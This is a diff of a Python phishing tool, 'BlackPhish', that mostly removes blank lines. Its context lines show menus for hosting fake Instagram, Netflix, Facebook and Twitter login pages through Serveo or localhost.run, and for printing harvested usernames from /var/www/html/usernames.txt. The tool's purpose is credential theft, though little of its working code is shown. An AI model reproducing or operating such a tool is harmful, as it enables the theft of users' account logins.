@@ -1,21 +1,11 @@
-#!/usr/bin/python3
-
-
+#!/usr/bin/env python3
 
 # You may change the code however you want
-
 # Please create pull request to support the tool
-
 # Please message us if you find any problems or ideas
-
-
-
 # Lasted updated: 1/26/20
-
 # version 3.2: - Bug fixes and improvements
-
 # Please update version number each time we update
-
 
 
 # Libraries #
@@ -52,9 +42,7 @@ blink = "\033[5m"
 # Check for python version #
 if version_info < (3,0,0):
     exit(red + "[!] Please use python3: sudo python3 blackphish.py" + reset)
-    
-    
-    
+
 # Check for root #
 if geteuid() != 0:
     exit(red + "[!] Please run as root" + reset)
@@ -107,7 +95,6 @@ def checkInternet(): # Checks for internet connection #
         exit(0)
 
 
-    
 # Port forward to Serveo #
 def serveoForward():
     name = input(yellow + "\nCustom Domain Name(don't need www. or domain extension): ")
@@ -214,13 +201,13 @@ def endMessage(): # Message when you exit #
 def main():
 
     system("clear") # clear screen #
-    
+
     checkInternet() # Check internet connection #
-    
+
     warning() # Agree to use with responsibily #
 
     system('clear') # clear screen #
-    
+
     banner() # Load Banner #
 
     choice = input(red + "        [" + blue + "BlackPhish" + red + "] -> ") # Get user input #
@@ -235,9 +222,7 @@ def main():
         print(red + '           [3]' + blue + ' localhost.run')
         print(red + '           [4]' + blue + ' Localhost only\n\n')
         choice1 = input(red + "        [" + blue + "BlackPhish-Instagram" + red + "] -> ")
-        
-        
-        
+
         # Instagram #
         if choice1 == '1':
             system("clear")
@@ -318,7 +303,7 @@ def main():
                         system("cat /var/www/html/usernames.txt")
                         print("\n______________________________________________________________________________" + reset)
                         endMessage()
-        
+
         elif choice1 == '3':
             system("clear")
             print(green + '[+] Copying Files')
@@ -356,7 +341,7 @@ def main():
                         system("cat /var/www/html/usernames.txt")
                         print("\n______________________________________________________________________________" + reset)
                         endMessage()
-                        
+
         elif choice1 == '4':
             system("clear")
             print(green + '[+] Copying Files')
@@ -584,7 +569,7 @@ def main():
         print(red + '           [3]' + blue + ' localhost.run')
         print(red + '           [4]' + blue + ' Localhost only\n\n')
         choice1 = input(red + "        [" + blue + "BlackPhish-Netflix" + red + "] -> ")
-        
+
         if choice1 == '1':
             system("clear")
             print(green + '[+] Copying Files')
@@ -753,7 +738,7 @@ def main():
         print(red + '           [3]' + blue + ' localhost.run')
         print(red + '           [4]' + blue + ' Localhost only\n\n')
         choice1 = input(red + "        [" + blue + "BlackPhish-Facebook" + red + "] -> ")
-        
+
         if choice1 == '1':
             system("clear")
             print(green + '[+] Copying Files')
@@ -921,7 +906,7 @@ def main():
         print(red + '           [3]' + blue + ' localhost.run')
         print(red + '           [4]' + blue + ' Localhost only\n\n')
         choice1 = input(red + "        [" + blue + "BlackPhish-Twitter" + red + "] -> ")
-        
+
         if choice1 == '1':
             system("clear")
             print(green + '[+] Copying Files')
@@ -1079,7 +1064,6 @@ def main():
                         system("cat /var/www/html/usernames.txt")
                         print("\n______________________________________________________________________________" + reset)
                         endMessage()
-                        
 
     # Clean out everything #
     elif choice == "0":
